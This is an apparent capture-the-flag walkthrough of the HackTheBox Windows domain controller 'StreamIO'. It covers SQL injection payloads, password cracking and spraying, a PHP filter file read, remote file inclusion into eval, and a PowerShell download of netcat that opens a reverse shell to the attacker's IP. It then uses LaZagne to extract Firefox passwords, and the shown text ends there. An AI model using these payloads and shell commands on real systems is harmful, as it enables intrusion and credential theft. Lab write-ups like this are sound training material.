---
title: "[HTB] Machine: StreamIO"
description: "[HTB] Machine: StreamIO"
date: 2023-09-11
menu:
  sidebar:
    name: "[HTB] Machine: StreamIO"
    identifier: htb-machine-StreamIO
    parent: htb-machines-windows
    weight: 10
hero: images/streamio.png
tags: ["HTB", "domain-controller", "php", "vhosts", "feroxbuster", "sqli", "sqli-union", "waf", "hashcat", "hydra", "lfi", "rfi", "mssql", "sqlcmd", "evil-winrm", "firefox", "firepwd", "bloodhound", "bloodhound-python", "laps", "writeowner"]
---

# StreamIO
## Enumeration
- `nmap`
```
└─$ nmap -Pn -p- 10.10.11.158 -T4 --min-rate 10000
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-13 19:18 BST
Nmap scan report for 10.10.11.158 (10.10.11.158)
Host is up (0.10s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49701/tcp open  unknown
55287/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 32.55 seconds

```
```
└─$ nmap -Pn -p53,80,88,135,139,389,443,445,464,593,636,3268,3269,5985,9389 -sC -sV 10.10.11.158 -T4 --min-rate 10000
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-13 19:19 BST
Nmap scan report for 10.10.11.158 (10.10.11.158)
Host is up (0.16s latency).

PORT     STATE    SERVICE          VERSION
53/tcp   open     domain           Simple DNS Plus
80/tcp   open     http             Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp   open     kerberos-sec     Microsoft Windows Kerberos (server time: 2023-09-14 01:19:00Z)
135/tcp  open     msrpc            Microsoft Windows RPC
139/tcp  open     netbios-ssn      Microsoft Windows netbios-ssn
389/tcp  open     ldap             Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
443/tcp  open     ssl/http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
| ssl-cert: Subject: commonName=streamIO/countryName=EU
| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb
| Not valid before: 2022-02-22T07:03:28
|_Not valid after:  2022-03-24T07:03:28
|_ssl-date: 2023-09-14T01:19:51+00:00; +6h59m23s from scanner time.
|_http-title: Not Found
| tls-alpn: 
|_  http/1.1
445/tcp  open     microsoft-ds?
464/tcp  open     kpasswd5?
593/tcp  open     ncacn_http       Microsoft Windows RPC over HTTP 1.0
636/tcp  open     tcpwrapped
3268/tcp filtered globalcatLDAP
3269/tcp filtered globalcatLDAPssl
5985/tcp open     http             Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp open     mc-nmf           .NET Message Framing
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m22s, deviation: 0s, median: 6h59m21s
| smb2-time: 
|   date: 2023-09-14T01:19:15
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 59.52 seconds
```
- `smb`
```
└─$ smbclient -N -L //10.10.11.158
session setup failed: NT_STATUS_ACCESS_DENIED
```
- `dns`
```
└─$ dig @10.10.11.158 streamIO.htb                                                                                          

; <<>> DiG 9.18.16-1-Debian <<>> @10.10.11.158 streamIO.htb
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 13035
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;streamIO.htb.                  IN      A

;; ANSWER SECTION:
streamIO.htb.           600     IN      A       10.10.11.158

;; Query time: 100 msec
;; SERVER: 10.10.11.158#53(10.10.11.158) (UDP)
;; WHEN: Wed Sep 13 19:26:32 BST 2023
;; MSG SIZE  rcvd: 57

```
```
└─$ dig axfr @10.10.11.158 streamIO.htb

; <<>> DiG 9.18.16-1-Debian <<>> axfr @10.10.11.158 streamIO.htb
; (1 server found)
;; global options: +cmd
; Transfer failed.
```
- `vhosts`
```
└─$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u https://watch.streamIO.htb -H 'Host: FUZZ.streamIO.htb' --hh 315
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://watch.streamIO.htb/
Total requests: 100000

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                    
=====================================================================

000003520:   200        78 L     245 W      2829 Ch     "watch"                                                                                                                                                                    
000037212:   400        6 L      26 W       334 Ch      "*"                                                                                                                                                                        

Total time: 1237.048
Processed Requests: 100000
Filtered Requests: 99998
Requests/sec.: 80.83756

```
```
└─$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://watch.streamIO.htb -H 'Host: FUZZ.streamIO.htb' --hh 703
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://watch.streamIO.htb/
Total requests: 100000

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                    
=====================================================================

000037212:   400        6 L      26 W       334 Ch      "*" 

Total time: 1021.031
Processed Requests: 100000
Filtered Requests: 99999
Requests/sec.: 66.52712
```
- Web Server
  - Port `80`

![](./images/1.png)

- Web Server
  - Port `443`

![](./images/2.png)

![](./images/3.png)

- `gobuster`
```
└─$ gobuster dir -u https://streamio.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x txt,php --no-error -k
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://streamio.htb/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
2023/09/16 14:46:18 Starting gobuster in directory enumeration mode
===============================================================
/about.php            (Status: 200) [Size: 7825]
/index.php            (Status: 200) [Size: 13497]
/images               (Status: 301) [Size: 151] [--> https://streamio.htb/images/]
/contact.php          (Status: 200) [Size: 6434]
/login.php            (Status: 200) [Size: 4145]
/register.php         (Status: 200) [Size: 4500]
/Images               (Status: 301) [Size: 151] [--> https://streamio.htb/Images/]
/admin                (Status: 301) [Size: 150] [--> https://streamio.htb/admin/]
/css                  (Status: 301) [Size: 148] [--> https://streamio.htb/css/]
/Contact.php          (Status: 200) [Size: 6434]
/About.php            (Status: 200) [Size: 7825]
/Index.php            (Status: 200) [Size: 13497]
/Login.php            (Status: 200) [Size: 4145]
/js                   (Status: 301) [Size: 147] [--> https://streamio.htb/js/]
/logout.php           (Status: 302) [Size: 0] [--> https://streamio.htb/]
/Register.php         (Status: 200) [Size: 4500]
/fonts                (Status: 301) [Size: 150] [--> https://streamio.htb/fonts/]
/IMAGES               (Status: 301) [Size: 151] [--> https://streamio.htb/IMAGES/]
/INDEX.php            (Status: 200) [Size: 13497]
/Fonts                (Status: 301) [Size: 150] [--> https://streamio.htb/Fonts/]
/Admin                (Status: 301) [Size: 150] [--> https://streamio.htb/Admin/]
/*checkout*           (Status: 400) [Size: 3420]
/CSS                  (Status: 301) [Size: 148] [--> https://streamio.htb/CSS/]
/JS                   (Status: 301) [Size: 147] [--> https://streamio.htb/JS/]
```
```
└─$ gobuster dir -u https://watch.streamio.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x txt,php --no-error -k
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://watch.streamio.htb/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
2023/09/16 14:46:49 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 2829]
/search.php           (Status: 200) [Size: 253887]
/static               (Status: 301) [Size: 157] [--> https://watch.streamio.htb/static/]
/Search.php           (Status: 200) [Size: 253887]
/Index.php            (Status: 200) [Size: 2829]
/INDEX.php            (Status: 200) [Size: 2829]
/*checkout*           (Status: 400) [Size: 3420]
/*docroot*            (Status: 400) [Size: 3420]
/*                    (Status: 400) [Size: 3420]
/blocked.php          (Status: 200) [Size: 677]

```
## Foothold
- I registered on the `streamio.htb` but couldn't login

![](./images/4.png)

![](./images/5.png)

![](./images/6.png)


- Clicking on `watch` button on `watch.streamio.htb` results in error

![](./images/8.png)

- The website also has `blocked.php` endpoint
  - Probably `WAF`

![](./images/7.png)

- When we search for `dog`, it shows every movie containing 'dog'

![](./images/9.png)

- The same goes for `test`

![](./images/10.png)

- It looks like the query is `SELECT * FROM MOVIES WHERE NAME LIKE '%dog%';`
  - Thus if the statement is correct, we could try injecting `man';-- -`
  - If the query is injectable, we should get all movies that end with `man`
    - There were no movies that end with `dog`

![](./images/11.png)

- And it works
  - We could start with stealing the hash
  - Start `responder`
    - `sudo responder -I tun0`
  - The payload
    - `man'; use master; exec xp_dirtree '\\10.10.16.4\anything';-- -`


![](./images/12.png)

- But `hashcat` has no results
  - `hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt`
  - So let's try dumping the database
    - https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
  - We can `UNION`-based injections
    - But we have to find the number of collumns
  - The final payload
    - `test' union select 1,2,3,4,5,6;-- -`

![](./images/13.png)

- We can use collumns `2` and `3` to dump the data
  - Let's check the databases
  - `test' union select 1,name,3,4,5,6 from master.dbo.sysdatabases;-- -`

![](./images/14.png)

- Now we dump the tables
  - Find the current database
    - `test' union select 1,(SELECT DB_NAME()),3,4,5,6;-- -`
  - Enumerate table names
    - `test' union select 1,name,id,4,5,6 FROM sysobjects WHERE xtype='U';-- -`

![](./images/15.png)

![](./images/16.png)

- Dump `users` table
  - Find the columns
    - `test' union select 1,name,id,4,5,6 FROM syscolumns WHERE id = 901578250;-- -`
  - Dump the table
    - `test' union select 1,concat(username,':', password), 3,4,5,6 FROM users;-- -`

![](./images/17.png)

![](./images/18.png)

- Let's try cracking them
```
└─$ hashcat -m 0 user-hash.list /usr/share/wordlists/rockyou.txt --user       
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-sandybridge-12th Gen Intel(R) Core(TM) i5-12400, 1436/2936 MB (512 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 30 digests; 30 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1
...

3577c47eb1e12c8ba021611e1280753c:highschoolmusical        
ee0b8a0937abd60c2882eacb2f8dc49f:physics69i               
665a50ac9eaa781e4f7f04199db97a11:paddpadd                 
b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..         
ef8f3d30a856cf166fb8215aca93e9ff:%$clara                  
2a4e2cf22dd8fcb45adcb91be1e22ae8:$monique$1991$           
54c88b2dbd7b1a84012fabc1a4c73415:$hadoW                   
6dcd87740abb64edfa36d170f0d5450d:$3xybitch                
08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##         
b83439b16f844bd6ffe35c02fe21b3c0:!?Love?!123              
b22abb47a02b52d5dfa27fb0b534f693:!5psycho8!               
f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$               
Approaching final keyspace - workload adjusted.           
...
```
```
admin:665a50ac9eaa781e4f7f04199db97a11:paddpadd
Barry:54c88b2dbd7b1a84012fabc1a4c73415:$hadoW
Bruno:2a4e2cf22dd8fcb45adcb91be1e22ae8:$monique$1991$
Clara:ef8f3d30a856cf166fb8215aca93e9ff:%$clara
Juliette:6dcd87740abb64edfa36d170f0d5450d:$3xybitch
Lauren:08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##
Lenord:ee0b8a0937abd60c2882eacb2f8dc49f:physics69i
Michelle:b83439b16f844bd6ffe35c02fe21b3c0:!?Love?!123
Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$
Thane:3577c47eb1e12c8ba021611e1280753c:highschoolmusical
Victoria:b22abb47a02b52d5dfa27fb0b534f693:!5psycho8!
yoshihide:b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..
```

- But none of them works for `smb`
```
└─$ crackmapexec smb 10.10.11.158 -u user.list -p pass.list --no-bruteforce --continue-on-success
SMB         10.10.11.158    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.158    445    DC               [-] streamIO.htb\admin:paddpadd STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\Barry:$hadoW STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\Bruno:$monique$1991$ STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\Clara:%$clara STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\Juliette:$3xybitch STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\Lauren:##123a8j8w5123## STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\Lenord:physics69i STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\Michelle:!?Love?!123 STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\Sabrina:!!sabrina$ STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\Thane:highschoolmusical STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\Victoria:!5psycho8! STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\yoshihide:66boysandgirls.. STATUS_LOGON_FAILURE 
```

- We could try the creds on `https://streamio.htb/login.php`

![](./images/19.png)

- Let's use `hydra`

```
└─$ hydra -C user-pass.list streamio.htb https-post-form "/login.php:username=^USER^&password=^PASS^:F=Login failed"
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-19 17:08:23
[DATA] max 12 tasks per 1 server, overall 12 tasks, 12 login tries, ~1 try per task
[DATA] attacking http-post-forms://streamio.htb:443/login.php:username=^USER^&password=^PASS^:F=Login failed
[4
43][http-post-form] host: streamio.htb   login: yoshihide   password: 66boysandgirls..
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-19 17:08:27
```

- We successfully login
  - And now we have access to `admin`

![](./images/20.png)

- We have nothing interesting,
  - The url is `https://streamio.htb/admin/?staff=`
  - When we click the panels, the parameter changes
    - `Staff Management -> https://streamio.htb/admin/?staff=`
    - `Movie Management -> https://streamio.htb/admin/?movie=`
    - `User Management -> https://streamio.htb/admin/?user=` 
  - We can try fuzzing the parameter

```
└─$ wfuzz -H "Cookie: PHPSESSID=1oqkt97ah49htfg0tli8rsthor" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'https://streamio.htb/admin/?FUZZ=' --hh 1678
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://streamio.htb/admin/?FUZZ=
Total requests: 6453

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                    
=====================================================================

000001575:   200        49 L       137 W      1712 Ch     "debug"
000003530:   200        10790 L    25878 W    320235 Ch   "movie"
000005450:   200        398 L      916 W      12484 Ch    "staff"
000006133:   200        62 L       160 W      2073 Ch     "user"

Total time: 80.34713
Processed Requests: 6453
Filtered Requests: 6449
Requests/sec.: 80.31400

```

![](./images/21.png)

- I was stuck here for a while
  - It looks like when I supply `index.php`, the page return error

![](./images/22.png)

- So it looks like I missed important endpoint
  - From now on, I will use `feroxbuster` in the background, which performs recursive directory search
```
└─$ feroxbuster -u https://streamio.htb -x php -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -k 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://streamio.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        2l       10w      150c https://streamio.htb/admin => https://streamio.htb/admin/
301      GET        2l       10w      151c https://streamio.htb/images => https://streamio.htb/images/
301      GET        2l       10w      147c https://streamio.htb/js => https://streamio.htb/js/
301      GET        2l       10w      148c https://streamio.htb/css => https://streamio.htb/css/
200      GET      395l      915w    13497c https://streamio.htb/index.php
200      GET      206l      430w     6434c https://streamio.htb/contact.php
200      GET      231l      571w     7825c https://streamio.htb/about.php
200      GET       51l      213w    19329c https://streamio.htb/images/client.jpg
200      GET      101l      173w     1663c https://streamio.htb/css/responsive.css
200      GET        5l      374w    21257c https://streamio.htb/js/popper.min.js
200      GET      863l     1698w    16966c https://streamio.htb/css/style.css
302      GET        0l        0w        0c https://streamio.htb/logout.php => https://streamio.htb/
200      GET      192l     1006w    82931c https://streamio.htb/images/icon.png
200      GET      111l      269w     4145c https://streamio.htb/login.php
200      GET        2l     1276w    88145c https://streamio.htb/js/jquery-3.4.1.min.js
200      GET      367l     1995w   166220c https://streamio.htb/images/contact-img.png
200      GET      191l      253w     3120c https://streamio.htb/css/login.css
200      GET      121l      291w     4500c https://streamio.htb/register.php
301      GET        2l       10w      157c https://streamio.htb/admin/images => https://streamio.htb/admin/images/
200      GET        0l        0w   233314c https://streamio.htb/images/about-img.png
200      GET      395l      915w    13497c https://streamio.htb/
301      GET        2l       10w      153c https://streamio.htb/admin/js => https://streamio.htb/admin/js/
301      GET        2l       10w      154c https://streamio.htb/admin/css => https://streamio.htb/admin/css/
301      GET        2l       10w      150c https://streamio.htb/fonts => https://streamio.htb/fonts/
403      GET        1l        1w       18c https://streamio.htb/admin/index.php
301      GET        2l       10w      156c https://streamio.htb/admin/fonts => https://streamio.htb/admin/fonts/
200      GET      274l     1677w   150222c https://streamio.htb/images/barry.png
200      GET     2059l    12754w  1028337c https://streamio.htb/images/samantha.png
200      GET        0l        0w   478934c https://streamio.htb/images/oliver.png
200      GET        2l        6w       58c https://streamio.htb/admin/master.php

```

- Now, if I supply `master.php` to `debug`
  - It returns everything from `STREAMIO` database

![](./images/23.png)

- Let's use `php` filter to dump the source code
  - `https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=master.php`

![](./images/24.png)

```
└─$ echo "..." | base64 -d
...
<?php
if(isset($_POST['include']))
{
if($_POST['include'] !== "index.php" ) 
eval(file_get_contents($_POST['include']));
else
echo(" ---- ERROR ---- ");
}
?>base64: invalid input
```

- We have a `include` parameter which we can use
  - It get the contents of the file and passes it to `eval`
  - We could try `RFI`
  - I'll try hosting file with `system('whoami');`
    - We must have `Content-Type: application/x-www-form-urlencoded` in our request or it won't work

![](./images/25.png)

- Let's get reverse shell
  - The payload
```                                                   
system("powershell -c wget 10.10.16.6/nc64.exe -outfile \\programdata\\nc.exe");
system("\\programdata\\nc.exe -e powershell 10.10.16.6 6666");
```

- Now we need to set our listener and send a request

![](./images/26.png)

## User #1
- Let's enumerate
```
PS C:\inetpub> findstr /spin "passw" *.php
findstr /spin "passw" *.php
streamio.htb\login.php:59:if(isset($_POST['username']) && isset($_POST['password']))
streamio.htb\login.php:64:    $pass = md5($_POST['password']);
streamio.htb\login.php:65:    $query = "select * from users where username = '$user' and password = '$pass'";
streamio.htb\login.php:97:              <input type="password" class="form-control" placeholder="Password" name="password">
streamio.htb\register.php:58:if(isset($_POST['username']) && isset($_POST['password']) && isset($_POST['confirm']))
streamio.htb\register.php:62:  ## password match check
streamio.htb\register.php:63:  if($_POST['password'] !== $_POST['confirm'])
streamio.htb\register.php:67:        Passwords do not match
streamio.htb\register.php:73:  $pass = md5($_POST['password']);
streamio.htb\register.php:83:    $query = "insert into users(username,password,is_staff) values('$user','$pass',0)";
streamio.htb\register.php:109:              <input type="password" class="form-control" placeholder="Choose a password" name="password">
streamio.htb\register.php:118:              <input type="password" class="form-control" placeholder="Confirm password" name="confirm">
PS C:\inetpub> findstr /spin "pwd" *.php
findstr /spin "pwd" *.php
streamio.htb\admin\index.php:9:$connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890');
streamio.htb\login.php:46:$connection = array("Database"=>"STREAMIO" , "UID" => "db_user", "PWD" => 'B1@hB1@hB1@h');
streamio.htb\register.php:81:    $connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890');
watch.streamio.htb\search.php:15:$connection = array("Database"=>"STREAMIO", "UID" => "db_user", "PWD" => 'B1@hB1@hB1@h');
```

- Now we can connect to `db` as `db_admin`
  - The box has `sqlcmd`
```
PS C:\inetpub> where.exe sqlcmd
where.exe sqlcmd
C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\SQLCMD.EXE
```
```
PS C:\inetpub> sqlcmd /?
sqlcmd /?
Microsoft (R) SQL Server Command Line Tool
Version 15.0.2000.5 NT
Copyright (C) 2019 Microsoft Corporation. All rights reserved.

usage: Sqlcmd            [-U login id]          [-P password]
  [-S server]            [-H hostname]          [-E trusted connection]
  [-N Encrypt Connection][-C Trust Server Certificate]
  [-d use database name] [-l login timeout]     [-t query timeout]
  [-h headers]           [-s colseparator]      [-w screen width]
  [-a packetsize]        [-e echo input]        [-I Enable Quoted Identifiers]
  [-c cmdend]            [-L[c] list servers[clean output]]
  [-q "cmdline query"]   [-Q "cmdline query" and exit]
  [-m errorlevel]        [-V severitylevel]     [-W remove trailing spaces]
  [-u unicode output]    [-r[0|1] msgs to stderr]
  [-i inputfile]         [-o outputfile]        [-z new password]
  [-f <codepage> | i:<codepage>[,o:<codepage>]] [-Z new password and exit]
  [-k[1|2] remove[replace] control characters]
  [-y variable length type display width]
  [-Y fixed length type display width]
  [-p[1] print statistics[colon format]]
  [-R use client regional setting]
  [-K application intent]
  [-M multisubnet failover]
  [-b On error batch abort]
  [-v var = "value"...]  [-A dedicated admin connection]
  [-X[1] disable commands, startup script, environment variables [and exit]]
  [-x disable variable substitution]
  [-j Print raw error messages]
  [-g enable column encryption]
  [-G use Azure Active Directory for authentication]
  [-? show syntax summary]

```

- Let's connect as `db_admin` and query from `streamio_backup` database
```
PS C:\inetpub> sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select table_name from streamio_backup.information_schema.tables;"
sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select table_name from streamio_backup.information_schema.tables;"
table_name                                                                                                                      
--------------------------------------------------------------------------------------------------------------------------------
movies                                                                                                                          
users                                                                                                                           

(2 rows affected)
```
```
PS C:\inetpub> sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select * from users;"
 sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select * from users;"
id          username                                           password                                          
----------- -------------------------------------------------- --------------------------------------------------
          1 nikk37                                             389d14cb8e4e9b94b137deb1caf0612a                  
          2 yoshihide                                          b779ba15cedfd22a023c4d8bcf5f2332                  
          3 James                                              c660060492d9edcaa8332d89c99c9239                  
          4 Theodore                                           925e5408ecb67aea449373d668b7359e                  
          5 Samantha                                           083ffae904143c4796e464dac33c1f7d                  
          6 Lauren                                             08344b85b329d7efd611b7a7743e8a09                  
          7 William                                            d62be0dc82071bccc1322d64ec5b6c51                  
          8 Sabrina                                            f87d3c0d6c8fd686aacc6627f1f493a5                  

(8 rows affected)
```

- Now we try cracking again
```
└─$ hashcat -m 0 user-hash.list /usr/share/wordlists/rockyou.txt --user       
hashcat (v6.2.6) starting
...
389d14cb8e4e9b94b137deb1caf0612a:get_dem_girls2@yahoo.com 
Approaching final keyspace - workload adjusted.           
...
```
```
└─$ hashcat -m 0 user-hash.list /usr/share/wordlists/rockyou.txt --user --show
nikk37:389d14cb8e4e9b94b137deb1caf0612a:get_dem_girls2@yahoo.com
yoshihide:b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..
Lauren:08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##
Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$
```

- Now let's check if creds for `nikk37` are valid
```
└─$ crackmapexec smb 10.10.11.158 -u 'nikk37' -p 'get_dem_girls2@yahoo.com'                      
SMB         10.10.11.158    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.158    445    DC               [+] streamIO.htb\nikk37:get_dem_girls2@yahoo.com
```

- And we can `winrm`
```
└─$ crackmapexec winrm 10.10.11.158 -u 'nikk37' -p 'get_dem_girls2@yahoo.com' 
SMB         10.10.11.158    5985   DC               [*] Windows 10.0 Build 17763 (name:DC) (domain:streamIO.htb)
HTTP        10.10.11.158    5985   DC               [*] http://10.10.11.158:5985/wsman
WINRM       10.10.11.158    5985   DC               [+] streamIO.htb\nikk37:get_dem_girls2@yahoo.com (Pwn3d!)
```

![](./images/27.png)

## User #2
- The box has `Firefox` installed
```
*Evil-WinRM* PS C:\> ls "Program Files (x86)"


    Directory: C:\Program Files (x86)


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        9/15/2018  12:28 AM                Common Files
d-----        2/25/2022  11:35 PM                IIS
d-----        2/25/2022  11:38 PM                iis express
d-----        3/28/2022   4:46 PM                Internet Explorer
d-----        2/22/2022   1:54 AM                Microsoft SQL Server
d-----        2/22/2022   1:53 AM                Microsoft.NET
d-----        5/26/2022   4:09 PM                Mozilla Firefox
d-----        5/26/2022   4:09 PM                Mozilla Maintenance Service
d-----        2/25/2022  11:33 PM                PHP
d-----        2/22/2022   2:56 AM                Reference Assemblies
d-----        3/28/2022   4:46 PM                Windows Defender
d-----        3/28/2022   4:46 PM                Windows Mail
d-----        3/28/2022   4:46 PM                Windows Media Player
d-----        9/15/2018  12:19 AM                Windows Multimedia Platform
d-----        9/15/2018  12:28 AM                windows nt
d-----        3/28/2022   4:46 PM                Windows Photo Viewer
d-----        9/15/2018  12:19 AM                Windows Portable Devices
d-----        9/15/2018  12:19 AM                WindowsPowerShell

```

- And `nikk37` has 2 profiles
```
*Evil-WinRM* PS C:\> ls C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles


    Directory: C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/22/2022   2:40 AM                5rwivk2l.default
d-----        2/22/2022   2:42 AM                br53rxeg.default-release

```

- Let's check them
  - We can download `key4.db` and `logins.json` files and use [Firepwd](https://github.com/lclevy/firepwd) to extract
  - Or use [LaZagne](https://github.com/AlessandroZ/LaZagne)
```
*Evil-WinRM* PS C:\users\nikk37> wget 10.10.16.6/LaZagne.exe -outfile lz.exe
*Evil-WinRM* PS C:\users\nikk37> .\lz.exe all

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|


########## User: nikk37 ##########

------------------- Firefox passwords -----------------

